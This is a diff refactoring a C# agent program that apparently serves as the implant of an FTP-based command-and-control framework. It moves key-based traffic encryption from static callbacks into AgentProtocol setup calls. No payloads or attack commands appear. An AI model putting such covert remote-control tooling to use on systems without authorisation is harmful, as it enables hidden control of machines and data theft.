@@ -48,31 +48,11 @@ class Program
 
     // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
 
-    public static AsymEncryptionHelper? SelfEncryptionHelper;
-    public static AsymEncryptionHelper? PeerEncryptionHelper;
-
     public static CancellationTokenSource CancellationTokenSource = new();
 
     public static void OnProcessExit(object? sender, EventArgs e)
     {
-        SelfEncryptionHelper?.Dispose();
-        PeerEncryptionHelper?.Dispose();
-    }
-
-    public static string OnEgressDataModifier(string data)
-    {
-        if (PeerEncryptionHelper == null || !PeerEncryptionHelper.HasPublicKey())
-            return data;
-
-        return PeerEncryptionHelper.EncryptToJson(Encoding.UTF8.GetBytes(data));
-    }
-
-    public static string OnIngressDataModifier(string data)
-    {
-        if (SelfEncryptionHelper == null || !SelfEncryptionHelper.HasPrivateKey())
-            return data;
-
-        return Encoding.UTF8.GetString(SelfEncryptionHelper.DecryptFromJson(data));
+        ///
     }
 
     public static void Main(string[] args)
@@ -91,24 +71,6 @@ class Program
         UX.DisplayInfo($"Agent Id: `{AgentSession}`");
         ///
 
-        try
-        {
-            SelfEncryptionHelper = new(EncodedPublicKey, EncodedPrivateKey);
-        }
-        catch
-        {
-            SelfEncryptionHelper = null;
-        }
-
-        try
-        {
-            PeerEncryptionHelper = new(EncodedPeerPublicKey, null);
-        }
-        catch
-        {
-            PeerEncryptionHelper = null;
-        }
-
         List<Thread> daemons = new();
 
         // It is crucial for this thread to maintain high availability in order to continuously
@@ -122,8 +84,8 @@ class Program
 
             AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);
 
-            agentProto.EgressDataModifier = OnEgressDataModifier;
-            agentProto.IngressDataModifier = OnIngressDataModifier;
+            agentProto.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
+            agentProto.SetupPeerEncryptionHelper(EncodedPeerPublicKey);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
@@ -154,8 +116,8 @@ class Program
 
             AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);
 
-            agentProto.EgressDataModifier = OnEgressDataModifier;
-            agentProto.IngressDataModifier = OnIngressDataModifier;
+            agentProto.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
+            agentProto.SetupPeerEncryptionHelper(EncodedPeerPublicKey);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
